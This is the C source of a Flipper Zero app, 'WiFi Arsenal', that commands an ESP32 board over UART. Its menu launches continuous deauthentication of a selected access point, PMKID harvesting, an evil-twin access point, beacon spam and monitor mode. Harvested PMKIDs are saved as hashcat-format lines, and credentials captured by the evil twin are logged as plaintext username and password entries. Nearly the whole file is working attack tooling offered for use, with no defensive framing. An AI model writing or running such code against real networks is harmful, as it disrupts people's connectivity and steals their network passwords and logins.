#include "wifi_arsenal.h"
#include <string.h>
#include <stdio.h>

#define TAG "WiFiArsenal"

// ─── JSON helpers ────────────────────────────────────────────────────────────

static const char* json_str(const char* json, const char* key, char* out, size_t out_len) {
    char search[64];
    snprintf(search, sizeof(search), "\"%s\":\"", key);
    const char* pos = strstr(json, search);
    if(!pos) return NULL;
    pos += strlen(search);
    const char* end = strchr(pos, '"');
    if(!end) return NULL;
    size_t len = (size_t)(end - pos);
    if(len >= out_len) len = out_len - 1;
    memcpy(out, pos, len);
    out[len] = '\0';
    return out;
}

static int json_int(const char* json, const char* key) {
    char search[64];
    snprintf(search, sizeof(search), "\"%s\":", key);
    const char* pos = strstr(json, search);
    if(!pos) return 0;
    pos += strlen(search);
    return atoi(pos);
}

// ─── UART receive ─────────────────────────────────────────────────────────────

static void uart_rx_handler(const uint8_t* data, size_t len, void* ctx) {
    WiFiArsenalApp* app = (WiFiArsenalApp*)ctx;
    furi_mutex_acquire(app->rx_mutex, FuriWaitForever);

    size_t space = sizeof(app->rx_buf) - app->rx_len - 1;
    size_t copy = len < space ? len : space;
    memcpy(app->rx_buf + app->rx_len, data, copy);
    app->rx_len += copy;
    app->rx_buf[app->rx_len] = '\0';

    // Check for "connected" ping from ESP32 on boot
    if(strstr(app->rx_buf, "\"status\":\"ready\"")) {
        app->esp32_connected = true;
    }

    furi_mutex_release(app->rx_mutex);
}

// ─── Log helper ───────────────────────────────────────────────────────────────

static void log_append(WiFiArsenalApp* app, const char* path, const char* line) {
    File* f = storage_file_alloc(app->storage);
    if(storage_file_open(f, path, FSAM_WRITE, FSOM_OPEN_APPEND)) {
        storage_file_write(f, line, strlen(line));
        storage_file_write(f, "\n", 1);
    }
    storage_file_close(f);
    storage_file_free(f);
}

// ─── Command senders ─────────────────────────────────────────────────────────

static void cmd_scan_ap(WiFiArsenalApp* app) {
    furi_mutex_acquire(app->rx_mutex, FuriWaitForever);
    app->rx_len = 0;
    app->rx_buf[0] = '\0';
    furi_mutex_release(app->rx_mutex);
    uart_bridge_send(app->uart, "{\"cmd\":\"scan\",\"type\":\"ap\"}\n");
}

static void cmd_deauth(WiFiArsenalApp* app, const char* bssid, bool continuous) {
    char buf[128];
    snprintf(buf, sizeof(buf),
        "{\"cmd\":\"deauth\",\"bssid\":\"%s\",\"continuous\":%s}\n",
        bssid, continuous ? "true" : "false");
    uart_bridge_send(app->uart, buf);
}

static void cmd_pmkid(WiFiArsenalApp* app, const char* bssid) {
    char buf[128];
    snprintf(buf, sizeof(buf),
        "{\"cmd\":\"pmkid\",\"bssid\":\"%s\"}\n",
        bssid ? bssid : "all");
    uart_bridge_send(app->uart, buf);
}

static void cmd_evil_twin(WiFiArsenalApp* app, const char* ssid, uint8_t channel) {
    char buf[256];
    snprintf(buf, sizeof(buf),
        "{\"cmd\":\"eviltwin\",\"ssid\":\"%s\",\"channel\":%u}\n",
        ssid, channel);
    uart_bridge_send(app->uart, buf);
}

static void cmd_beacon_spam(WiFiArsenalApp* app, const char* ssid) {
    char buf[256];
    snprintf(buf, sizeof(buf),
        "{\"cmd\":\"beacon\",\"ssid\":\"%s\"}\n",
        ssid ? ssid : "random");
    uart_bridge_send(app->uart, buf);
}

static void cmd_monitor(WiFiArsenalApp* app, bool start) {
    char buf[64];
    snprintf(buf, sizeof(buf),
        "{\"cmd\":\"monitor\",\"enable\":%s}\n",
        start ? "true" : "false");
    uart_bridge_send(app->uart, buf);
}

static void cmd_stop(WiFiArsenalApp* app) {
    uart_bridge_send(app->uart, "{\"cmd\":\"stop\"}\n");
    app->attack_running = false;
}

// ─── Parse scan response ─────────────────────────────────────────────────────

static void parse_scan_response(WiFiArsenalApp* app) {
    app->ap_count = 0;
    const char* json = app->rx_buf;

    const char* entry = json;
    while(app->ap_count < MAX_AP_COUNT) {
        entry = strstr(entry, "{\"ssid\":");
        if(!entry) break;

        AccessPoint* ap = &app->ap_list[app->ap_count];
        memset(ap, 0, sizeof(AccessPoint));

        json_str(entry, "ssid", ap->ssid, sizeof(ap->ssid));
        json_str(entry, "bssid", ap->bssid, sizeof(ap->bssid));
        ap->rssi = (int8_t)json_int(entry, "rssi");
        ap->channel = (uint8_t)json_int(entry, "ch");
        ap->enc = (uint8_t)json_int(entry, "enc");

        app->ap_count++;
        entry++;
    }
}

// ─── Scanner view ─────────────────────────────────────────────────────────────

static void scanner_draw_cb(Canvas* canvas, void* ctx) {
    WiFiArsenalApp* app = (WiFiArsenalApp*)ctx;
    canvas_clear(canvas);
    canvas_set_font(canvas, FontSecondary);

    if(app->ap_count == 0) {
        canvas_draw_str(canvas, 2, 20, "Scanning...");
        canvas_draw_str(canvas, 2, 32, "Press OK to refresh");
        return;
    }

    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 0, 10, "APs Found:");

    canvas_set_font(canvas, FontSecondary);
    uint8_t y = 20;
    uint8_t start = app->selected_ap > 3 ? app->selected_ap - 3 : 0;

    for(uint8_t i = start; i < app->ap_count && y < 62; i++) {
        AccessPoint* ap = &app->ap_list[i];

        if(i == app->selected_ap) {
            canvas_draw_box(canvas, 0, y - 8, 128, 10);
            canvas_set_color(canvas, ColorWhite);
        }

        char line[48];
        snprintf(line, sizeof(line), "%-20.20s ch%02u %ddBm",
            ap->ssid[0] ? ap->ssid : "(hidden)",
            ap->channel, ap->rssi);
        canvas_draw_str(canvas, 2, y, line);

        if(i == app->selected_ap) canvas_set_color(canvas, ColorBlack);
        y += 10;
    }
}

// ─── Menu callbacks ───────────────────────────────────────────────────────────

static void menu_callback(void* ctx, uint32_t index) {
    WiFiArsenalApp* app = (WiFiArsenalApp*)ctx;

    switch((WiFiArsenalMenuItem)index) {
    case WiFiArsenalMenuScanner:
        cmd_scan_ap(app);
        view_dispatcher_switch_to_view(app->view_dispatcher, WiFiArsenalViewScanner);
        break;

    case WiFiArsenalMenuDeauth:
        if(app->ap_count > 0) {
            AccessPoint* ap = &app->ap_list[app->selected_ap];
            app->attack_running = true;
            cmd_deauth(app, ap->bssid, true);
            notification_message(app->notifications, &sequence_blink_red_100);
        }
        break;

    case WiFiArsenalMenuPMKID:
        app->attack_running = true;
        cmd_pmkid(app, app->ap_count > 0 ? app->ap_list[app->selected_ap].bssid : NULL);
        break;

    case WiFiArsenalMenuEvilTwin:
        if(app->ap_count > 0) {
            AccessPoint* ap = &app->ap_list[app->selected_ap];
            app->attack_running = true;
            cmd_evil_twin(app, ap->ssid, ap->channel);
        }
        break;

    case WiFiArsenalMenuBeaconSpam:
        app->attack_running = true;
        cmd_beacon_spam(app, NULL);
        break;

    case WiFiArsenalMenuMonitor:
        app->attack_running = !app->attack_running;
        cmd_monitor(app, app->attack_running);
        break;

    case WiFiArsenalMenuSettings:
        view_dispatcher_switch_to_view(app->view_dispatcher, WiFiArsenalViewSettings);
        break;
    }
}

static uint32_t exit_to_menu(void* ctx) {
    UNUSED(ctx);
    return WiFiArsenalViewMenu;
}

static uint32_t exit_app(void* ctx) {
    UNUSED(ctx);
    return VIEW_NONE;
}

// ─── PMKID result handler ─────────────────────────────────────────────────────

static void handle_pmkid_result(WiFiArsenalApp* app) {
    furi_mutex_acquire(app->rx_mutex, FuriWaitForever);

    // Look for PMKID hash in response: {"pmkid":"<hash>","bssid":"...","ssid":"..."}
    const char* pos = app->rx_buf;
    while((pos = strstr(pos, "\"pmkid\":\"")) != NULL) {
        char hash[256] = {0}, bssid[MAX_BSSID_LEN] = {0}, ssid[MAX_SSID_LEN] = {0};
        const char* chunk = pos - 1;
        // Find the enclosing JSON object start
        while(chunk > app->rx_buf && *chunk != '{') chunk--;

        json_str(chunk, "pmkid", hash, sizeof(hash));
        json_str(chunk, "bssid", bssid, sizeof(bssid));
        json_str(chunk, "ssid", ssid, sizeof(ssid));

        if(hash[0] && bssid[0]) {
            // Format: pmkid*bssid_client*bssid_ap*ssid (hc22000)
            char line[512];
            // Normalize BSSIDs: remove colons for hc22000 format
            char bssid_norm[13] = {0};
            size_t j = 0;
            for(size_t i = 0; bssid[i] && j < 12; i++) {
                if(bssid[i] != ':') bssid_norm[j++] = bssid[i];
            }
            bssid_norm[12] = '\0';

            snprintf(line, sizeof(line),
                "WPA*01*%s*%s*000000000000*%s***",
                hash, bssid_norm, bssid_norm);

            log_append(app, WIFI_LOG_PMKID, line);
            notification_message(app->notifications, &sequence_blink_green_100);
        }
        pos++;
    }

    furi_mutex_release(app->rx_mutex);
}

// ─── Credential result handler ────────────────────────────────────────────────

static void handle_credential_result(WiFiArsenalApp* app) {
    furi_mutex_acquire(app->rx_mutex, FuriWaitForever);

    const char* pos = app->rx_buf;
    while((pos = strstr(pos, "\"cred\":")) != NULL) {
        char user[128] = {0}, pass[128] = {0}, ssid[MAX_SSID_LEN] = {0};
        const char* chunk = pos - 1;
        while(chunk > app->rx_buf && *chunk != '{') chunk--;

        json_str(chunk, "user", user, sizeof(user));
        json_str(chunk, "pass", pass, sizeof(pass));
        json_str(chunk, "ssid", ssid, sizeof(ssid));

        if(user[0] || pass[0]) {
            char line[512];
            snprintf(line, sizeof(line), "SSID:%s USER:%s PASS:%s", ssid, user, pass);
            log_append(app, WIFI_LOG_CREDS, line);
            notification_message(app->notifications, &sequence_blink_magenta_100);
        }
        pos++;
    }

    furi_mutex_release(app->rx_mutex);
}

// ─── App init / deinit ───────────────────────────────────────────────────────

static WiFiArsenalApp* wifi_arsenal_alloc(void) {
    WiFiArsenalApp* app = malloc(sizeof(WiFiArsenalApp));
    furi_assert(app);
    memset(app, 0, sizeof(WiFiArsenalApp));

    app->rx_mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    app->notifications = furi_record_open(RECORD_NOTIFICATION);
    app->storage = furi_record_open(RECORD_STORAGE);

    // Ensure log dir exists
    storage_simply_mkdir(app->storage, WIFI_LOG_DIR);

    app->gui = furi_record_open(RECORD_GUI);
    app->view_dispatcher = view_dispatcher_alloc();
    view_dispatcher_enable_queue(app->view_dispatcher);
    view_dispatcher_attach_to_gui(app->view_dispatcher, app->gui, ViewDispatcherTypeFullscreen);

    // Menu
    app->menu = menu_alloc();
    menu_add_item(app->menu, "Scan APs",       NULL, WiFiArsenalMenuScanner,   menu_callback, app);
    menu_add_item(app->menu, "Deauth Target",  NULL, WiFiArsenalMenuDeauth,    menu_callback, app);
    menu_add_item(app->menu, "PMKID Harvest",  NULL, WiFiArsenalMenuPMKID,     menu_callback, app);
    menu_add_item(app->menu, "Evil Twin AP",   NULL, WiFiArsenalMenuEvilTwin,  menu_callback, app);
    menu_add_item(app->menu, "Beacon Spam",    NULL, WiFiArsenalMenuBeaconSpam,menu_callback, app);
    menu_add_item(app->menu, "Monitor Mode",   NULL, WiFiArsenalMenuMonitor,   menu_callback, app);
    menu_set_selected_item(app->menu, 0);
    view_set_previous_callback(menu_get_view(app->menu), exit_app);
    view_dispatcher_add_view(app->view_dispatcher, WiFiArsenalViewMenu, menu_get_view(app->menu));

    // Text box (log view)
    app->text_box = text_box_alloc();
    text_box_set_font(app->text_box, TextBoxFontText);
    view_set_previous_callback(text_box_get_view(app->text_box), exit_to_menu);
    view_dispatcher_add_view(app->view_dispatcher, WiFiArsenalViewLog, text_box_get_view(app->text_box));

    // Scanner custom view
    View* scanner_view = view_alloc();
    view_set_context(scanner_view, app);
    view_set_draw_callback(scanner_view, scanner_draw_cb);
    view_set_previous_callback(scanner_view, exit_to_menu);
    view_dispatcher_add_view(app->view_dispatcher, WiFiArsenalViewScanner, scanner_view);

    // UART
    app->uart = uart_bridge_alloc(uart_rx_handler, app);

    // Ping ESP32
    furi_delay_ms(500);
    uart_bridge_send(app->uart, "{\"cmd\":\"ping\"}\n");
    furi_delay_ms(300);

    furi_mutex_acquire(app->rx_mutex, FuriWaitForever);
    app->esp32_connected = strstr(app->rx_buf, "\"status\":\"ready\"") != NULL;
    furi_mutex_release(app->rx_mutex);

    return app;
}

static void wifi_arsenal_free(WiFiArsenalApp* app) {
    furi_assert(app);

    if(app->attack_running) cmd_stop(app);

    view_dispatcher_remove_view(app->view_dispatcher, WiFiArsenalViewMenu);
    view_dispatcher_remove_view(app->view_dispatcher, WiFiArsenalViewLog);
    view_dispatcher_remove_view(app->view_dispatcher, WiFiArsenalViewScanner);

    menu_free(app->menu);
    text_box_free(app->text_box);

    view_dispatcher_free(app->view_dispatcher);
    furi_record_close(RECORD_GUI);

    uart_bridge_free(app->uart);

    furi_record_close(RECORD_STORAGE);
    furi_record_close(RECORD_NOTIFICATION);
    furi_mutex_free(app->rx_mutex);

    free(app);
}

// ─── Entry point ─────────────────────────────────────────────────────────────

int32_t wifi_arsenal_app(void* p) {
    UNUSED(p);
    WiFiArsenalApp* app = wifi_arsenal_alloc();

    if(!app->esp32_connected) {
        // Show warning but continue — board may still respond
        FURI_LOG_W(TAG, "ESP32-S2 not detected on UART");
    }

    view_dispatcher_switch_to_view(app->view_dispatcher, WiFiArsenalViewMenu);
    view_dispatcher_run(app->view_dispatcher);

    // Drain any pending PMKID/credential results before exiting
    handle_pmkid_result(app);
    handle_credential_result(app);

    wifi_arsenal_free(app);
    return 0;
}
